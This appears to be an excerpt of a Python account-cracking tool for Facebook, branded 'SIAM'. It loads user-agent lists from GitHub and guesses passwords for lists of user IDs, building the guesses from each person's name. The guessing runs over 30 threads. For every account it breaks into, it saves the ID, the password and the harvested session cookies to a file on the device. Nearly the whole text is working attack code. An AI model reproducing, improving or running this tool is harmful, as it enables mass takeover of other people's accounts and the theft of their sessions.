...
DX_POWER_143 = requests.get("https://raw.githubusercontent.com/Mosarofsiamkhan/Ua1.txt/main/Ua_text").text.splitlines()

TARA_505 = random.choice(DX_POWER_143)


VERSION = requests.get("https://raw.githubusercontent.com/Mosarofsiamkhan/Version/main/Version.text").text.splitlines()
...
sys.stdout.write('\x1b]2; SIAM\x07')
...
{G5} ███████ ██ ██   ██ ██      ██   {G4}V{G3}/{G2}{V}
{A}──────────────────────────────────────────────────
{G1}[{A}={G1}]{G1} OWNER    {A}:{G1} Siam-king
{G1}[{A}={G2}]{G2} FACEBOOK {A}:{G2} Siam khan
...
def menu():   
    ...
    if select =='1':
        ...
        os.system('xdg-open https://facebook.com/groups/8050601605043026/');menu()
    elif select =='0':
...
#__________________[ FILE METHOD M1 ]__________________#           
    def methodA(self, sid, name, psw):
        try:
            ...
            sys.stdout.write(f"\r{G1}[{A}SIAM-M1{G1}]{R}[{sid}][{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
        ...
        try:
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SIAMb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SIAMb};{ckkk}"
                    print(f"\r\r{G1}[SIAM-OK] {sid} | {ps} ")
                    open('/sdcard/SIAM-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[SIAM-CP] {sid} | {ps} ")
...
#__________________[ PASSWORD ]__________________#
    def pasw(self):       
            ...
            linex()
            with Habib(max_workers=30) as SIAMworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
...
def randm(ids,psd):
    global loop,ok,cp
    sys.stdout.write(f"\r{G1}[{A}SIAM-XD{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
            ...
            if 'access_token' in q:
                ...
                print(f'\r\r{G1}[SIAM-OK] {uid} | {pas}')
